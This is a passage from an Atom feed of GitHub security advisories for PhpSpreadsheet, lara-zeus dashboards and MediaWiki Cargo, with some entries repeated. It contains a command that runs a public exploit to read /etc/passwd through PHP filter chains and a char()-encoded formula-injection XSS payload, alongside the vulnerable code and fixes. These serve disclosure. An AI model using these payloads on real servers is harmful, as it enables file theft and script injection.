<p>Download the error oracle Python script from here: <a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">https://github.com/synacktiv/php_filter_chains_oracle_exploit</a>. If your memory limit is greater than 128M, you'll need to edit the Python script's <code>bruteforcer.py</code> file to change <code>self.blow_up_inf = self.join(*[self.blow_up_utf32]*15)</code> to <code>self.blow_up_inf = self.join(*[self.blow_up_utf32]*20)</code>. This is needed so that it generates large-enough payloads to trigger the out of memory errors the oracle relies on. Also install the script's dependencies with <code>pip</code>.</p>
<p>Then run the Python script with:</p>
<pre><code>python3 filters_chain_oracle_exploit.py --target [URL of the script] --parameter payload --file /etc/passwd
</code></pre>
<p>Note that the attack relies on certain character encodings being supported by the system's <code>iconv</code> library, because PHP uses that. As far as I know, most Linux distributions have them, but notably MacOS does not. So if you're developing on a Mac, you'll want to run your server in a virtual machine with Linux.</p>
<p>Here's the results I got after about a minute of bruteforcing:</p>
<p><img alt="image" src="https://github.com/PHPOffice/PhpSpreadsheet/assets/1294941/06cbaf62-1001-481f-bbcd-d818a61896c4"></p>
<h3 id="impact">Impact</h3>
<p>An attacker can access any file on the server, or leak information form arbitrary URLs, potentially exposing sensitive information such as AWS IAM credentials.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-5gpr-w2p5-6m37">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-5gpr-w2p5-6m37</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/a9693d1182df6695c14bc5d74315ac71a3398e5a">https://github.com/PHPOffice/PhpSpreadsheet/commit/a9693d1182df6695c14bc5d74315ac71a3398e5a</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/d95bc290beb137d4118095b96f62ec47e0205cec">https://github.com/PHPOffice/PhpSpreadsheet/commit/d95bc290beb137d4118095b96f62ec47e0205cec</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/e04ed222b36fd5fd6fed0c10c765c2b68effb465">https://github.com/PHPOffice/PhpSpreadsheet/commit/e04ed222b36fd5fd6fed0c10c765c2b68effb465</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-w9xv-qf98-ccq4">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-w9xv-qf98-ccq4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45290">https://nvd.nist.gov/vuln/detail/CVE-2024-45290</a></li>
<li><a href="https://github.com/advisories/GHSA-5gpr-w2p5-6m37">https://github.com/advisories/GHSA-5gpr-w2p5-6m37</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5gpr-w2p5-6m37</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-07T15:57:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[lara-zeus/artemis] Lara-zeus Dynamic Dashboard and Artemis do not validate paragraph widget values which can be used for XSS]]></title>
        <id>https://github.com/advisories/GHSA-c6cw-g7fc-4gwc</id>
        <link href="https://github.com/advisories/GHSA-c6cw-g7fc-4gwc"/>
        <updated>2024-10-07T19:37:39.000Z</updated>
        <content type="html"><![CDATA[<h1 id="summary">Summary</h1>
<p>If values passed to a paragraph widget are not valid and contain a specific set of characters, applications are vulnerable to XSS attack against a user who opens a page on which a paragraph widget is rendered.</p>
<p>Versions of dynamic dashboard from v3.0.0 through v3.0.2 are affected.</p>
<p>Please upgrade to dynamic dashboard <a href="https://github.com/lara-zeus/dynamic-dashboard/releases/tag/v3.0.2">v3.0.2</a>.</p>
<h1 id="poc">PoC</h1>
<blockquote>
<p>PoC will be published in a few weeks, once developers have had a chance to upgrade their apps.</p>
</blockquote>
<h1 id="response">Response</h1>
<p>This vulnerability (in paragraph widget only) was reported by <strong>Raghav Sharma</strong>, who reported the issue and patched the issue during the morning of 05/10/2024. Thank you <strong>Raghav Sharma</strong>.</p>
<p>The review process concluded the same day at night, which revealed the issue was also present in paragraph widget. This was fixed the same day and dynamic dashboard <a href="https://github.com/lara-zeus/dynamic-dashboard/releases/tag/v3.0.2">v3.0.2</a> followed.</p>
<h2 id="note">Note:</h2>
<p>if you're published the view (blade files), you have to republish them or check the changes on release to update the affected file.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lara-zeus/dynamic-dashboard/security/advisories/GHSA-c6cw-g7fc-4gwc">https://github.com/lara-zeus/dynamic-dashboard/security/advisories/GHSA-c6cw-g7fc-4gwc</a></li>
<li><a href="https://github.com/lara-zeus/artemis/commit/4636f58628d20d3e78ea8514406bd7da94997f2c">https://github.com/lara-zeus/artemis/commit/4636f58628d20d3e78ea8514406bd7da94997f2c</a></li>
<li><a href="https://github.com/lara-zeus/dynamic-dashboard/commit/adfb4b1cdfdaa01299631f0e569ce201a7cc545a">https://github.com/lara-zeus/dynamic-dashboard/commit/adfb4b1cdfdaa01299631f0e569ce201a7cc545a</a></li>
<li><a href="https://github.com/advisories/GHSA-c6cw-g7fc-4gwc">https://github.com/advisories/GHSA-c6cw-g7fc-4gwc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c6cw-g7fc-4gwc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-07T14:55:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[lara-zeus/dynamic-dashboard] Lara-zeus Dynamic Dashboard and Artemis do not validate paragraph widget values which can be used for XSS]]></title>
        <id>https://github.com/advisories/GHSA-c6cw-g7fc-4gwc</id>
        <link href="https://github.com/advisories/GHSA-c6cw-g7fc-4gwc"/>
        <updated>2024-10-07T19:37:39.000Z</updated>
        <content type="html"><![CDATA[<h1 id="summary">Summary</h1>
<p>If values passed to a paragraph widget are not valid and contain a specific set of characters, applications are vulnerable to XSS attack against a user who opens a page on which a paragraph widget is rendered.</p>
<p>Versions of dynamic dashboard from v3.0.0 through v3.0.2 are affected.</p>
<p>Please upgrade to dynamic dashboard <a href="https://github.com/lara-zeus/dynamic-dashboard/releases/tag/v3.0.2">v3.0.2</a>.</p>
<h1 id="poc">PoC</h1>
<blockquote>
<p>PoC will be published in a few weeks, once developers have had a chance to upgrade their apps.</p>
</blockquote>
<h1 id="response">Response</h1>
<p>This vulnerability (in paragraph widget only) was reported by <strong>Raghav Sharma</strong>, who reported the issue and patched the issue during the morning of 05/10/2024. Thank you <strong>Raghav Sharma</strong>.</p>
<p>The review process concluded the same day at night, which revealed the issue was also present in paragraph widget. This was fixed the same day and dynamic dashboard <a href="https://github.com/lara-zeus/dynamic-dashboard/releases/tag/v3.0.2">v3.0.2</a> followed.</p>
<h2 id="note">Note:</h2>
<p>if you're published the view (blade files), you have to republish them or check the changes on release to update the affected file.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lara-zeus/dynamic-dashboard/security/advisories/GHSA-c6cw-g7fc-4gwc">https://github.com/lara-zeus/dynamic-dashboard/security/advisories/GHSA-c6cw-g7fc-4gwc</a></li>
<li><a href="https://github.com/lara-zeus/artemis/commit/4636f58628d20d3e78ea8514406bd7da94997f2c">https://github.com/lara-zeus/artemis/commit/4636f58628d20d3e78ea8514406bd7da94997f2c</a></li>
<li><a href="https://github.com/lara-zeus/dynamic-dashboard/commit/adfb4b1cdfdaa01299631f0e569ce201a7cc545a">https://github.com/lara-zeus/dynamic-dashboard/commit/adfb4b1cdfdaa01299631f0e569ce201a7cc545a</a></li>
<li><a href="https://github.com/advisories/GHSA-c6cw-g7fc-4gwc">https://github.com/advisories/GHSA-c6cw-g7fc-4gwc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c6cw-g7fc-4gwc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-07T14:55:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mediawiki/cargo] Mediawiki Cargo extension vulnerable to Cross-site Scripting]]></title>
        <id>https://github.com/advisories/GHSA-jqvm-9xm2-gc38</id>
        <link href="https://github.com/advisories/GHSA-jqvm-9xm2-gc38"/>
        <updated>2024-10-07T14:50:53.000Z</updated>
        <content type="html"><![CDATA[<p>Improper Neutralization of Input During Web Page Generation (XSS or 'Cross-site Scripting') vulnerability in The Wikimedia Foundation Mediawiki - Cargo allows Cross-Site Scripting (XSS).This issue affects Mediawiki - Cargo: from 3.6.X before 3.6.1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47847">https://nvd.nist.gov/vuln/detail/CVE-2024-47847</a></li>
<li><a href="https://gerrit.wikimedia.org/r/c/mediawiki/extensions/Cargo/+/1063804">https://gerrit.wikimedia.org/r/c/mediawiki/extensions/Cargo/+/1063804</a></li>
<li><a href="https://gerrit.wikimedia.org/r/c/mediawiki/extensions/Cargo/+/1063806">https://gerrit.wikimedia.org/r/c/mediawiki/extensions/Cargo/+/1063806</a></li>
<li><a href="https://gerrit.wikimedia.org/r/c/mediawiki/extensions/Cargo/+/1063827">https://gerrit.wikimedia.org/r/c/mediawiki/extensions/Cargo/+/1063827</a></li>
<li><a href="https://gerrit.wikimedia.org/r/c/mediawiki/extensions/Cargo/+/1063831">https://gerrit.wikimedia.org/r/c/mediawiki/extensions/Cargo/+/1063831</a></li>
<li><a href="https://phabricator.wikimedia.org/T368628">https://phabricator.wikimedia.org/T368628</a></li>
<li><a href="https://phabricator.wikimedia.org/T372211">https://phabricator.wikimedia.org/T372211</a></li>
<li><a href="https://github.com/advisories/GHSA-jqvm-9xm2-gc38">https://github.com/advisories/GHSA-jqvm-9xm2-gc38</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jqvm-9xm2-gc38</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-05T03:30:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet has an Unauthenticated Cross-Site-Scripting (XSS) in sample file]]></title>
        <id>https://github.com/advisories/GHSA-v66g-p9x6-v98p</id>
        <link href="https://github.com/advisories/GHSA-v66g-p9x6-v98p"/>
        <updated>2024-10-07T22:24:52.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>One of the sample scripts in PhpSpreadsheet is susceptible to a cross-site scripting (XSS) vulnerability due to improper handling of input where a number is expected leading to formula injection.</p>
<h3 id="details">Details</h3>
<p>The following <a href="https://github.com/PHPOffice/PhpSpreadsheet/blob/d50b8b5de7e30439fb57eae7df9ea90e79fa0f2d/samples/Basic/45_Quadratic_equation_solver.php#L56">code</a> in <code>45_Quadratic_equation_solver.php</code> concatenates the user supplied parameters directly into spreadsheet formulas. This allows an attacker to take control over the formula and output unsanitized data into the page, resulting in JavaScript execution.</p>
<pre><code>$discriminantFormula = '=POWER(' . $_POST['B'] . ',2) - (4 * ' . $_POST['A'] . ' * ' . $_POST['C'] . ')';
$discriminant = Calculation::getInstance()-&gt;calculateFormula($discriminantFormula);

$r1Formula = '=IMDIV(IMSUM(-' . $_POST['B'] . ',IMSQRT(' . $discriminant . ')),2 * ' . $_POST['A'] . ')';
$r2Formula = '=IF(' . $discriminant . '=0,"Only one root",IMDIV(IMSUB(-' . $_POST['B'] . ',IMSQRT(' . $discriminant . ')),2 * ' . $_POST['A'] . '))';
</code></pre>
<h3 id="poc">PoC</h3>
<ol>
<li>Access <code>45_Quadratic_equation_solver.php</code> in a browser</li>
<li>Enter any valid values for for <code>b</code> and <code>c</code>, and enter the following for <code>a</code></li>
</ol>
<pre><code>1) &amp; ("1)),1)&amp;char(60)&amp;char(105)&amp;char(109)&amp;char(103)&amp;char(32)&amp;char(115)&amp;char(114)&amp;char(99)&amp;char(61)&amp;char(120)&amp;char(32)&amp;char(111)&amp;char(110)&amp;char(101)&amp;char(114)&amp;char(114)&amp;char(111)&amp;char(114)&amp;char(61)&amp;char(97)&amp;char(108)&amp;char(101)&amp;char(114)&amp;char(116)&amp;char(40)&amp;char(41)&amp;char(62)&amp;POWER(((1") &amp;n("1")&amp;(1
</code></pre>
<ol start="3">
<li>Press submit and observe that JavaScript is executed.</li>
</ol>
<p><img alt="exploit-phpspreadsheet" src="https://user-images.githubusercontent.com/1211162/297062610-0cdb26d1-2b47-46e2-bd31-189b0694186d.png"></p>
<h3 id="impact">Impact</h3>
<p>The impact of this vulnerability on the project is expected to be relatively low since these are sample files that should not be included when the library is used properly (e.g., through composer). However, at least two instances of popular WordPress plugins have unintentionally exposed this file by including the entire git repository. Since these files also serve as reference points for developers using the library, addressing this issue can enhance security for users.</p>
<p>A solution to fix the vulnerability is proposed below, and a request for a CVE assignment has been made to facilitate responsible disclosure of the security issue to the affected WordPress plugins.</p>
<h3 id="remediation">Remediation</h3>
<p>A quick and easy solution to prevent this attack is to force the parameters to be numerical values:</p>
<pre><code class="language-php">if (isset($_POST['submit'])) {
    $_POST['A'] = floatval($_POST['A']);
    $_POST['B'] = floatval($_POST['B']);
    $_POST['C'] = floatval($_POST['C']);
    if ($_POST['A'] == 0) {
</code></pre>
<p>Thank you for your time!</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-v66g-p9x6-v98p">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-v66g-p9x6-v98p</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/3990173db1207767139e63d33783beafada57007">https://github.com/PHPOffice/PhpSpreadsheet/commit/3990173db1207767139e63d33783beafada57007</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/bc74f3aa1d76f191c6c7c3631e286abb25c38759">https://github.com/PHPOffice/PhpSpreadsheet/commit/bc74f3aa1d76f191c6c7c3631e286abb25c38759</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/fb42a103f14cfce258c836b31f4a71f1fb1a9747">https://github.com/PHPOffice/PhpSpreadsheet/commit/fb42a103f14cfce258c836b31f4a71f1fb1a9747</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45060">https://nvd.nist.gov/vuln/detail/CVE-2024-45060</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/blob/d50b8b5de7e30439fb57eae7df9ea90e79fa0f2d/samples/Basic/45_Quadratic_equation_solver.php#L56">https://github.com/PHPOffice/PhpSpreadsheet/blob/d50b8b5de7e30439fb57eae7df9ea90e79fa0f2d/samples/Basic/45_Quadratic_equation_solver.php#L56</a></li>
<li><a href="https://github.com/advisories/GHSA-v66g-p9x6-v98p">https://github.com/advisories/GHSA-v66g-p9x6-v98p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v66g-p9x6-v98p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-07T14:43:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet has an Unauthenticated Cross-Site-Scripting (XSS) in sample file]]></title>
        <id>https://github.com/advisories/GHSA-v66g-p9x6-v98p</id>
        <link href="https://github.com/advisories/GHSA-v66g-p9x6-v98p"/>
        <updated>2024-10-07T22:24:52.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>One of the sample scripts in PhpSpreadsheet is susceptible to a cross-site scripting (XSS) vulnerability due to improper handling of input where a number is expected leading to formula injection.</p>
<h3 id="details">Details</h3>
<p>The following <a href="https://github.com/PHPOffice/PhpSpreadsheet/blob/d50b8b5de7e30439fb57eae7df9ea90e79fa0f2d/samples/Basic/45_Quadratic_equation_solver.php#L56">code</a> in <code>45_Quadratic_equation_solver.php</code> concatenates the user supplied parameters directly into spreadsheet formulas. This allows an attacker to take control over the formula and output unsanitized data into the page, resulting in JavaScript execution.</p>
<pre><code>$discriminantFormula = '=POWER(' . $_POST['B'] . ',2) - (4 * ' . $_POST['A'] . ' * ' . $_POST['C'] . ')';
$discriminant = Calculation::getInstance()-&gt;calculateFormula($discriminantFormula);

$r1Formula = '=IMDIV(IMSUM(-' . $_POST['B'] . ',IMSQRT(' . $discriminant . ')),2 * ' . $_POST['A'] . ')';
$r2Formula = '=IF(' . $discriminant . '=0,"Only one root",IMDIV(IMSUB(-' . $_POST['B'] . ',IMSQRT(' . $discriminant . ')),2 * ' . $_POST['A'] . '))';
</code></pre>
<h3 id="poc">PoC</h3>
<ol>
<li>Access <code>45_Quadratic_equation_solver.php</code> in a browser</li>
<li>Enter any valid values for for <code>b</code> and <code>c</code>, and enter the following for <code>a</code></li>
</ol>
<pre><code>1) &amp; ("1)),1)&amp;char(60)&amp;char(105)&amp;char(109)&amp;char(103)&amp;char(32)&amp;char(115)&amp;char(114)&amp;char(99)&amp;char(61)&amp;char(120)&amp;char(32)&amp;char(111)&amp;char(110)&amp;char(101)&amp;char(114)&amp;char(114)&amp;char(111)&amp;char(114)&amp;char(61)&amp;char(97)&amp;char(108)&amp;char(101)&amp;char(114)&amp;char(116)&amp;char(40)&amp;char(41)&amp;char(62)&amp;POWER(((1") &amp;n("1")&amp;(1
</code></pre>
<ol start="3">
<li>Press submit and observe that JavaScript is executed.</li>
</ol>
<p><img alt="exploit-phpspreadsheet" src="https://user-images.githubusercontent.com/1211162/297062610-0cdb26d1-2b47-46e2-bd31-189b0694186d.png"></p>
<h3 id="impact">Impact</h3>
<p>The impact of this vulnerability on the project is expected to be relatively low since these are sample files that should not be included when the library is used properly (e.g., through composer). However, at least two instances of popular WordPress plugins have unintentionally exposed this file by including the entire git repository. Since these files also serve as reference points for developers using the library, addressing this issue can enhance security for users.</p>
<p>A solution to fix the vulnerability is proposed below, and a request for a CVE assignment has been made to facilitate responsible disclosure of the security issue to the affected WordPress plugins.</p>
<h3 id="remediation">Remediation</h3>
<p>A quick and easy solution to prevent this attack is to force the parameters to be numerical values:</p>
<pre><code class="language-php">if (isset($_POST['submit'])) {
    $_POST['A'] = floatval($_POST['A']);
    $_POST['B'] = floatval($_POST['B']);
    $_POST['C'] = floatval($_POST['C']);
    if ($_POST['A'] == 0) {
</code></pre>
<p>Thank you for your time!</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-v66g-p9x6-v98p">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-v66g-p9x6-v98p</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/3990173db1207767139e63d33783beafada57007">https://github.com/PHPOffice/PhpSpreadsheet/commit/3990173db1207767139e63d33783beafada57007</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/bc74f3aa1d76f191c6c7c3631e286abb25c38759">https://github.com/PHPOffice/PhpSpreadsheet/commit/bc74f3aa1d76f191c6c7c3631e286abb25c38759</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/fb42a103f14cfce258c836b31f4a71f1fb1a9747">https://github.com/PHPOffice/PhpSpreadsheet/commit/fb42a103f14cfce258c836b31f4a71f1fb1a9747</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45060">https://nvd.nist.gov/vuln/detail/CVE-2024-45060</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/blob/d50b8b5de7e30439fb57eae7df9ea90e79fa0f2d/samples/Basic/45_Quadratic_equation_solver.php#L56">https://github.com/PHPOffice/PhpSpreadsheet/blob/d50b8b5de7e30439fb57eae7df9ea90e79fa0f2d/samples/Basic/45_Quadratic_equation_solver.php#L56</a></li>
<li><a href="https://github.com/advisories/GHSA-v66g-p9x6-v98p">https://github.com/advisories/GHSA-v66g-p9x6-v98p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v66g-p9x6-v98p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-07T14:43:30.000Z</published>
    </entry>
</feed>